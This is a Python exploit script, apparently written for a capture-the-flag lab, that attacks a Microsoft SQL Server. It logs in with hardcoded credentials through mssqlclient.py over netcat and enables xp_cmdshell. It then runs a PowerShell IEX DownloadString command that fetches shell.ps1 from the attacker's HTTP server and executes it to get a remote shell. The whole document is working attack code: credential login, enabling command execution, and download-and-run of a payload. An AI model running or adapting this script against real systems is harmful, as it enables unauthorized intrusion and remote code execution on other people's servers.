from pwn import *
import subprocess
from threading import Thread
from queue import Queue, Empty
import time


# Opens the server for the shell.ps1 payload
http_server = subprocess.Popen(["python2", "-m", "SimpleHTTPServer"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

# Opens the netcat service with the the SQL command line
sql_command = ["nc", "-lvnp" , "6867", "-e", "mssqlclient.py -p 1433 -windows-auth mssql-svc:corporate568@10.10.10.125"]
sql_netcat = subprocess.Popen(sql_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

try:
    r = remote("127.1", 6867)

    print(r.recvuntil("Press help for extra shell commands").decode("utf-8"))
    print(r.read())

    r.sendline("enable_xp_cmdshell")
    print(r.read().decode("utf-8"))
    print(r.read().decode("utf-8"))

    r.sendline("xp_cmdshell powershell IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.55:8000/shell.ps1\\\")")
    print(r.read().decode("utf-8"))

    r.close()
    
    sql_netcat.terminate()
    http_server.terminate()


except Exception as e:
    print(e)
